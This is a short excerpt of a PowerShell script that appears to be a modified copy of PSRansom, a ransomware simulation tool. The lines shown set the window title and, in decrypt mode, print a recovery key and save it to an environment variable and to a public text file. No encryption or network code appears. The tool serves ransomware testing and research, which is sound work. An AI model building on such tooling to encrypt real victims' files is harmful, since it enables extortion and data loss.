...
$Host.UI.RawUI.WindowTitle = "PSRansom - by @JoelGMSec - Modified by HakkYahud" 
...
if ($Mode -eq "-d") { 
   ...
   Write-Host "[+] Recovery key: $PSRKey"
   [System.Environment]::SetEnvironmentVariable('RecoveryKey',$PSRKey)
   Set-Content -Path $env:public\recoverykey.txt -Value $PSRkey
